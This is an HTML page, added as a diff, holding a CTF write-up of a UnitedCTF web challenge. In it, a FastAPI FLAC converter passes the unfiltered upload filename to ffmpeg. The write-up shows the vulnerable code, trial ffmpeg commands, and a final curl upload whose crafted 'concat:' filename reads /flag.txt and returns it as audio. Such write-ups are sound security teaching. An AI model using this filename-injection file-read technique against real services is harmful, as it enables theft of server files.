@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF writeups</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header will be loaded here -->
+    <div id="header-placeholder"></div>
+    <div class="main-content">
+        <div class="container">
+<h4 id="challenge-details">Challenge details</h4>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>Web</td>
+</tr>
+<tr>
+<td><strong>Challenge Type</strong></td>
+<td>Single</td>
+</tr>
+<tr>
+<td><strong>Points</strong></td>
+<td>7</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td><code>Linkster78</code></td>
+</tr>
+<tr>
+<td><strong>Original Solver</strong></td>
+<td><code>labubu sauce graine</code> (willi34)</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>6/10</td>
+</tr>
+</tbody>
+</table>
+<h4 id="overview">Overview</h4>
+<p>The challenge is a simple python application that converts an audio file into a <strong>FLAC</strong> (Free Lossless Audio Codec) format, which just means the audio file is compressed without loosing any bits of data :
+<img alt="Web app pic" src="/images/unitedctf2025/taux1.png" /></p>
+<p>The code behind the application is relatively short and pretty simple :</p>
+<pre class="codehilite"><code class="language-python">import io
+import pathlib
+from typing import Annotated
+from fastapi import FastAPI, File, UploadFile
+import subprocess
+import uuid
+import os
+
+from fastapi.responses import JSONResponse, StreamingResponse
+from fastapi.staticfiles import StaticFiles
+
+TEMPORARY_FILE_DIR = pathlib.Path('workdir').resolve()
+MAX_UPLOAD_SIZE = 1024 * 1024 * 32 # 32mb
+ALLOWED_EXTENSIONS = {'.flac', '.wav', '.mp3', '.m4a', '.wma', '.ogg'}
+
+api = FastAPI()
+
+app = FastAPI()
+app.mount('/api', api)
+app.mount('/', StaticFiles(directory='static', html=True))
+
+@api.post(&quot;/convert&quot;)
+async def convert(file: Annotated[UploadFile, File()]):
+    if file.size &gt; MAX_UPLOAD_SIZE:
+        return JSONResponse(content={'error': 'file too large'}, status_code=400)
+
+    filename: str = os.path.basename(file.filename)
+    print(&quot;[+] Original filename used in ffpmeg &quot; + file.filename)
+    print(&quot;[+] Extracted filename used in ffpmeg &quot; + filename)
+
+    if os.path.splitext(filename)[1] not in ALLOWED_EXTENSIONS:
+        return JSONResponse(content={'error': 'unsupported file extension'}, status_code=400)
+
+    try:
+        input_path = TEMPORARY_FILE_DIR.joinpath(filename)
+        with open(input_path, 'wb') as f:
+            f.write(file.file.read())
+
+        output_path = TEMPORARY_FILE_DIR.joinpath(f'{uuid.uuid4()}.flac')
+
+        print(f'converting to flac: {input_path} -&gt; {output_path}')
+
+        proc = subprocess.run(
+           ['/usr/bin/ffmpeg', '-protocol_whitelist', 'file,concat', '-i', file.filename, output_path],
+           cwd=TEMPORARY_FILE_DIR,
+           timeout=10,
+        )
+
+        assert proc.returncode == 0
+
+        with open(output_path, 'rb') as f:
+            output_data = f.read()
+        return StreamingResponse(io.BytesIO(output_data), media_type='audio/flac', headers={
+            'Content-Disposition': f'attachment; filename={filename}.flac'
+        })
+    finally:
+        try:
+            os.remove(input_path)
+            os.remove(output_path)
+        except FileNotFoundError:
+            pass
+</code></pre>
+
+<p>In short, the code does the following when a file is uploaded :</p>
+<ol>
+<li>Validates the file size, anything over 32MB is rejected</li>
+<li>Takes in the filename's base (everything after the last slash), then checks the extension part of this base to see if it matches the allowed file types</li>
+<li>Appends the filename extracted from the base to <code>/app/workdir</code>, and puts the requests file inside that file</li>
+<li>The server generates a uuid as filename in the same directory, which serves as the output file for the <code>ffmpeg</code> tool</li>
+<li>The tool is ran with <code>subprocess.run</code>, which converts the uploaded audio file to a FLAC format. The <code>ffmpeg</code> tool will convert the file based on the output file's extension</li>
+</ol>
+<h4 id="vulnerability">Vulnerability</h4>
+<p>Command and argument injection do not work in this case since the <code>subprocess.run</code>function is not running with the <code>shell=True</code> parameter, meaning the arguments we give the function are treated as strings and properly escaped. </p>
+<p>There are two important things to note however.</p>
+<p>First, the <code>ffmpeg</code> command runs with the original provided filename from the request instead of the filtered one, which allows the usage of absolute paths and other tricks. The filtered filename is only used to create the file that will contain our uploaded file's contents.</p>
+<p>Second, the <code>ffmpeg</code> command has the <code>concat</code> protocol enabled, which allows us to concatenate media files directly before being converted. This process is easy if the media files have the same codecs, but not so much if they aren't.</p>
+<p>We can use these two features together to attempt to concatenate the flag stored at <code>/flag.txt</code> with a media file in order to exfiltrate the flag. </p>
+<h4 id="trial-and-error">Trial and error</h4>
+<p>First, we'll try to concatenate a text file with random audio formats. <code>ffmpeg</code>'s concat protocol can be used directly on the command line as an argument (see the documentation <a href="https://trac.ffmpeg.org/wiki/Concatenate#protocol">here</a>). Since the application uses the original unfiltered file name in the command, we'll be able to utilize this :</p>
+<pre class="codehilite"><code>ffmpeg -protocol_whitelist file,concat -i &quot;concat:test.mp3|test.mp3&quot; test.flac
+</code></pre>
+
+<p>We are also able to use absolute paths in the concat protocol, which will come in handy to reach the flag. However, ffmpeg's conversions are rather strict, and text cannot directly be concatenated to existing audio :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/taux/test]
+└─$ ffmpeg -protocol_whitelist file,concat -i &quot;concat:/home/kali/united/taux/server-dist/health/sample.mp3|test.txt&quot; test.flac
+ffmpeg version 7.1.1-1+b9 Copyright (c) 2000-2025 the FFmpeg developers
+ &lt;SNIP&gt;
+Input #0, mp3, from 'concat:/home/kali/united/taux/server-dist/health/sample.mp3|test.txt':
+  Metadata:
+    encoder         : Lavf61.7.100
+  Duration: 00:01:30.07, start: 0.025057, bitrate: 128 kb/s
+  Stream #0:0: Audio: mp3 (mp3float), 44100 Hz, stereo, fltp, 128 kb/s
+      Metadata:
+        encoder         : Lavf
+File 'test.flac' already exists. Overwrite? [y/N] y
+Stream mapping:
+  Stream #0:0 -&gt; #0:0 (mp3 (mp3float) -&gt; flac (native))
+Press [q] to stop, [?] for help
+[flac @ 0x555b478e3880] encoding as 24 bits-per-sample, more is considered experimental. Add -strict experimental if you want to encode more than 24 bits-per-sample
+Output #0, flac, to 'test.flac':                                                                                                                                     
+  Metadata:
+    encoder         : Lavf61.7.100
+  Stream #0:0: Audio: flac, 44100 Hz, stereo, s32 (24 bit), 128 kb/s
+      Metadata:
+        encoder         : Lavc61.19.101 flac
+[mp3float @ 0x555b478f3a40] Header missing
+[aist#0:0/mp3 @ 0x555b478e6ac0] [dec:mp3float @ 0x555b478e66c0] Error submitting packet to decoder: Invalid data found when processing input                         
+[out#0/flac @ 0x555b478e6cc0] video:0KiB audio:8874KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.091188%                               
+size=    8882KiB time=00:01:30.01 bitrate= 808.3kbits/s speed= 411x
+</code></pre>
+
+<p>The resulting file still exists, but <code>ffmpeg</code> seems to just skip over the text file entirely. All other audio formats seem to do the same. Moreover, putting the text file in front of the audio sample in the concatenation just results in an error. So how are we supposed to turn text into a FLAC format?</p>
+<h4 id="text-to-sound-exfiltration">Text-to-sound exfiltration</h4>
+<p>After a bit of research, we can find that it's possible to convert text into sound by encoding raw bytes as audio samples (called raw 8-bit PCM audio) :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/taux/test]
+└─$ cat test.txt     
+test
+
+
+┌──(kali㉿kali)-[~/united/taux/test]
+└─$ ffmpeg -f u8 -ar 44100 -ac 1 -i test.txt test.flac
+ffmpeg version 7.1.1-1+b9 Copyright (c) 2000-2025 the FFmpeg developers
+  &lt;SNIP&gt;
+[u8 @ 0x55a0c5273980] Estimating duration from bitrate, this may be inaccurate
+[aist#0:0/pcm_u8 @ 0x55a0c527f340] Guessed Channel Layout: mono
+Input #0, u8, from 'test.txt':
+  Duration: 00:00:00.00, bitrate: 353 kb/s
+  Stream #0:0: Audio: pcm_u8, 44100 Hz, mono, u8, 352 kb/s
+Stream mapping:
+  Stream #0:0 -&gt; #0:0 (pcm_u8 (native) -&gt; flac (native))
+Press [q] to stop, [?] for help
+Output #0, flac, to 'test.flac':
+  Metadata:
+    encoder         : Lavf61.7.100
+  Stream #0:0: Audio: flac, 44100 Hz, mono, s16, 128 kb/s
+      Metadata:
+        encoder         : Lavc61.19.101 flac
+[out#0/flac @ 0x55a0c527f540] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 46033.333333%
+size=       8KiB time=00:00:00.00 bitrate=587893.8kbits/s speed=0.0727x    
+</code></pre>
+
+<p>The original text can be easily recovered as well by reversing the process :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/taux/test]
+└─$ ffmpeg -i test.flac -f u8 -acodec pcm_u8 recovered.txt
+ffmpeg version 7.1.1-1+b9 Copyright (c) 2000-2025 the FFmpeg developers
+  &lt;SNIP&gt;
+Input #0, flac, from 'test.flac':
+  Metadata:
+    encoder         : Lavf61.7.100
+  Duration: 00:00:00.00, bitrate: 587893 kb/s
+  Stream #0:0: Audio: flac, 44100 Hz, mono, s16
+Stream mapping:
+  Stream #0:0 -&gt; #0:0 (flac (native) -&gt; pcm_u8 (native))
+Press [q] to stop, [?] for help
+Output #0, u8, to 'recovered.txt':
+  Metadata:
+    encoder         : Lavf61.7.100
+  Stream #0:0: Audio: pcm_u8, 44100 Hz, mono, u8, 352 kb/s
+      Metadata:
+        encoder         : Lavc61.19.101 pcm_u8
+[out#0/u8 @ 0x55b727d4d500] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.000000%
+size=       0KiB time=00:00:00.00 bitrate= 354.0kbits/s speed=0.0899x    
+
+
+┌──(kali㉿kali)-[~/united/taux/test]
+└─$ cat recovered.txt 
+test
+</code></pre>
+
+<p>Armed with this knowledge, we can aim to find a way to get <code>ffmpeg</code> to encode the file we provide it with properly. Easier said than done though, since we don't have the luxury of directly adding arguments to the original command.</p>
+<p>So I began looking at other options for the concat protocol, one of which being the demuxer file. Instead of having a regular media file processed, the tool can also parse a file that contains information on what other files to combine and how. This demuxer file can look something like this :</p>
+<pre class="codehilite"><code>ffconcat version 1.0
+file 'part1.mp4'
+file 'part2.mp4'
+inpoint 00:00:05.0
+outpoint 00:00:15.0
+file 'part3.mp4'
+</code></pre>
+
+<p>According to the documentation, it's also possible to add something similar to an option in this file, for example :</p>
+<pre class="codehilite"><code>ffconcat version 1.0
+file 'test.txt'
+option format u8
+</code></pre>
+
+<p>There are a few problems with this approach however. First, we can't use the options in the demuxer file without the safe being mode disabled in the original command with <code>-safe 0</code> :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/taux/server-dist]
+└─$ cat exploit.ogg 
+ffconcat version 1.0
+file 'test.txt'
+option format u8
+
+
+┌──(kali㉿kali)-[~/united/taux/server-dist]
+└─$ ffmpeg -protocol_whitelist file,concat -i &quot;exploit.ogg&quot; test2.flac
+ffmpeg version 7.1.1-1+b9 Copyright (c) 2000-2025 the FFmpeg developers
+ &lt;SNIP&gt;
+[concat @ 0x555df867a940] Line 3: option not allowed if safe
+[in#0 @ 0x555df867a680] Error opening input: Invalid data found when processing input                                                                                
+Error opening input file exploit.ogg.                                                                                                                             
+Error opening input files: Invalid data found when processing input
+</code></pre>
+
+<p><em>You can't seem to just disable the safe mode from inside the demuxer file either, believe me I tried hard to get this to work this way</em></p>
+<p>Second, unlike the protocol used on the command line, the use of absolute file paths doesn't work without safe mode disabled either :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/taux/server-dist]
+└─$ ffmpeg -protocol_whitelist file,concat -i &quot;exploit.ogg&quot; test2.flac
+ffmpeg version 7.1.1-1+b9 Copyright (c) 2000-2025 the FFmpeg developers
+  &lt;SNIP&gt;
+[concat @ 0x55cb9c03f940] Unsafe file name '/home/kali/united/taux/server-dist/test.txt'
+[in#0 @ 0x55cb9c03f680] Error opening input: Operation not permitted                                                                                            
+Error opening input file exploit.ogg.                                                                                                                            
+Error opening input files: Operation not permitted
+</code></pre>
+
+<p>We can't seem to be able to use the concat protocol inside of the demuxer file to use absolute paths either. <a href="https://trac.ffmpeg.org/ticket/5558">This</a> post sums up our frustrations pretty well.  </p>
+<p>At this point I hit a roadblock on this challenge, unsure where to go from here. There are some interesting known vulnerabilities within <code>ffmpeg</code>, like the famous SSRF via HLS <a href="https://krevetk0.medium.com/ssrf-vulnerability-via-ffmpeg-hls-processing-f3823c16f3c7">vulnerability</a>, but none of them really apply to our current situation.</p>
+<p>After a few hours of not so fun reflection time about how much of a fraud I am, it hit me. What if instead of applying some option to make <code>ffmpeg</code> encode the text properly, we concatenate the text file with an empty file containing the signature of an audio file? Would <code>ffmpeg</code> then attempt to encode our text file properly as audio? </p>
+<h4 id="trial-and-error-part-2">Trial and error part 2</h4>
+<p>I began testing this theory with all allowed audio formats we could upload. This worked with WAV files, where we can first add the first few magic bytes corresponding to this format into a file :</p>
+<pre class="codehilite"><code class="language-php">&lt;?php
+$header = pack(
+    'A4VA4A4VvvVVvvA4V',
+    'RIFF',        // ChunkID
+    36,            // ChunkSize = 36 + Subchunk2Size (0)
+    'WAVE',        // Format
+    'fmt ',        // Subchunk1ID
+    16,            // Subchunk1Size (PCM)
+    1,             // AudioFormat
+    1,             // NumChannels
+    44100,         // SampleRate
+    44100 * 2,     // ByteRate
+    2,             // BlockAlign
+    16,            // BitsPerSample
+    'data',        // Subchunk2ID
+    0              // Subchunk2Size (no audio data)
+);
+
+file_put_contents('empty.wav', $header);
+?&gt;
+</code></pre>
+
+<p>Here's the first success :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/taux]
+└─$ cat test.txt 
+flag-you_found_me_and_so_it_continues_forever
+
+┌──(kali㉿kali)-[~/united/taux]
+└─$ ffmpeg -protocol_whitelist file,concat -i &quot;concat:empty.wav|test.txt&quot; hope.flac
+ffmpeg version 7.1.1-1+b9 Copyright (c) 2000-2025 the FFmpeg developers
+  &lt;SNIP&gt;
+[wav @ 0x55a02cfbb940] Packet corrupt (stream = 0, dts = NOPTS).
+[wav @ 0x55a02cfbb940] Estimating duration from bitrate, this may be inaccurate                                                                                   
+[aist#0:0/pcm_s16le @ 0x55a02cfc0300] Guessed Channel Layout: mono                                                                                                
+Input #0, wav, from 'concat:empty.wav|test.txt':                                                                                                                 
+  Duration: 00:00:00.00, bitrate: 2431 kb/s
+  Stream #0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 44100 Hz, mono, s16, 705 kb/s
+Stream mapping:
+  Stream #0:0 -&gt; #0:0 (pcm_s16le (native) -&gt; flac (native))
+Press [q] to stop, [?] for help
+[in#0/wav @ 0x55a02cfbb680] corrupt input packet in stream 0
+Output #0, flac, to 'hope.flac':                                                                                                                               
+  Metadata:
+    encoder         : Lavf61.7.100
+  Stream #0:0: Audio: flac, 44100 Hz, mono, s16, 128 kb/s
+      Metadata:
+        encoder         : Lavc61.19.101 flac
+[out#0/flac @ 0x55a02cfc0480] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 18013.043478%
+size=       8KiB time=00:00:00.00 bitrate=326745.1kbits/s speed=0.0354x    
+</code></pre>
+
+<p>We can even see some (but not all, depends on the test length) of the characters of our original text file inside the resulting FLAC file, meaning our exfiltration was successful :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/taux]
+└─$ cat hope.flac                                                                  
+fLaC&quot;..
+�@�     ���C�x▒cK��@�D!,
+                        Lavf61.7.100encoder=Lavf61.7.100� �%Nlfgay-uof_uodnm_�
+                                                                                @�M��V��Ă
+                                                                                         �� \G 
+</code></pre>
+
+<p>This extraction also works when concatenating another empty WAV file after the text file (remember, we need a valid file extension at the end of our filename and <code>ffmpeg</code> errors out whenever the text comes first) :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/taux]
+└─$ ffmpeg -protocol_whitelist file,concat -i &quot;concat:empty.wav|test.txt|empty.wav&quot; hope2.flac
+ffmpeg version 7.1.1-1+b9 Copyright (c) 2000-2025 the FFmpeg developers
+  &lt;SNIP&gt;
+[wav @ 0x563c2a44e940] Packet corrupt (stream = 0, dts = NOPTS).
+[wav @ 0x563c2a44e940] Estimating duration from bitrate, this may be inaccurate                                                                     
+[aist#0:0/pcm_s16le @ 0x563c2a4534c0] Guessed Channel Layout: mono                                                                                                
+Input #0, wav, from 'concat:empty.wav|test.txt|empty.wav':                                                                                                        
+  Duration: 00:00:00.00, bitrate: 1050 kb/s
+  Stream #0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 44100 Hz, mono, s16, 705 kb/s
+Stream mapping:
+  Stream #0:0 -&gt; #0:0 (pcm_s16le (native) -&gt; flac (native))
+Press [q] to stop, [?] for help
+[in#0/wav @ 0x563c2a44e680] corrupt input packet in stream 0
+Output #0, flac, to 'hope2.flac':                                                                                                                                 
+  Metadata:
+    encoder         : Lavf61.7.100
+  Stream #0:0: Audio: flac, 44100 Hz, mono, s16, 128 kb/s
+      Metadata:
+        encoder         : Lavc61.19.101 flac
+[out#0/flac @ 0x563c2a4536c0] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 7205.217391%
+size=       8KiB time=00:00:00.00 bitrate=65890.2kbits/s speed=0.702x    
+</code></pre>
+
+<p>I almost had a heart attack extracting the original text from the new FLAC file. Decoding the audio back to text the same way as before only returned gibberish, and I could literally see a part of my fake flag in the raw audio. So close, yet so far.........</p>
+<p>From looking at the command's output, I then realized <code>ffmpeg</code> decided to encode my text in <code>pcm_s16le</code>, which meant it was encoded by transforming each 2 bytes into an audio sample instead of just 1. Luckily, <code>ffmpeg</code> has a format for both, allowing us to retrieve the full original text and allowing me to keep my sanity a little longer :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/taux]
+└─$ ffmpeg -i hope2.flac -f s16le recovered.raw
+ffmpeg version 7.1.1-1+b9 Copyright (c) 2000-2025 the FFmpeg developers
+  &lt;SNIP&gt;
+Input #0, flac, from 'hope2.flac':
+  Metadata:
+    encoder         : Lavf61.7.100
+  Duration: 00:00:00.00, bitrate: 95283 kb/s
+  Stream #0:0: Audio: flac, 44100 Hz, mono, s16
+Stream mapping:
+  Stream #0:0 -&gt; #0:0 (flac (native) -&gt; pcm_s16le (native))
+Press [q] to stop, [?] for help
+Output #0, s16le, to 'recovered.raw':
+  Metadata:
+    encoder         : Lavf61.7.100
+  Stream #0:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s
+      Metadata:
+        encoder         : Lavc61.19.101 pcm_s16le
+[out#0/s16le @ 0x55f11df0b4c0] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.000000%
+size=       0KiB time=00:00:00.00 bitrate= 705.5kbits/s speed=0.493x    
+
+┌──(kali㉿kali)-[~/united/taux]
+└─$ cat recovered.raw 
+flag-you_found_me_and_so_it_continues_forever
+RIFF$WAVEfmt D��Xdata
+</code></pre>
+
+<h4 id="final-solution">Final solution</h4>
+<p>When the application receives our request, it will extract <code>empty.wav</code> as the input filename inside <code>/app/workdir/</code> and put our uploaded file (<code>@empty.wav</code>) inside. The concat protocol inside <code>ffmpeg</code> will reference this same file twice, sandwiching the flag inside :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/taux]
+└─$ curl -F 'file=@empty.wav;filename=concat:/app/workdir/empty.wav|/flag.txt|/app/workdir/empty.wav' https://aux-45-tours-eb1876f303.challenges.unitedctf.ca/api/convert -o flag.flac
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  8699    0  8389  100   310  33594   1241 --:--:-- --:--:-- --:--:-- 34935
+</code></pre>
+
+<p>Decoding the flag :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/taux]
+└─$ ffmpeg -i flag.flac -f s16le flag.raw 
+ffmpeg version 7.1.1-1+b9 Copyright (c) 2000-2025 the FFmpeg developers
+  &lt;SNIP&gt;
+Input #0, flac, from 'flag.flac':
+  Metadata:
+    encoder         : Lavf60.16.100
+  Duration: 00:00:00.00, bitrate: 77856 kb/s
+  Stream #0:0: Audio: flac, 44100 Hz, mono, s16
+Stream mapping:
+  Stream #0:0 -&gt; #0:0 (flac (native) -&gt; pcm_s16le (native))
+Press [q] to stop, [?] for help
+Output #0, s16le, to 'flag.raw':
+  Metadata:
+    encoder         : Lavf61.7.100
+  Stream #0:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s
+      Metadata:
+        encoder         : Lavc61.19.101 pcm_s16le
+[out#0/s16le @ 0x5585105525c0] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.000000%
+size=       0KiB time=00:00:00.00 bitrate= 705.3kbits/s speed=0.29x    
+
+
+┌──(kali㉿kali)-[~/united/taux]
+└─$ cat flag.raw     
+flag-M3rc1Fabr1c3B3ll4rd0f8b2e15
+RIFF$WAVEfmt D��Xdata 
+</code></pre>
+    <!-- Footer will be loaded here -->
+        </div>
+    </div>
+    <div id="footer-placeholder"></div>
+    <script src="/js/script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-ruby.min.js"></script>
+</body>
+</html>
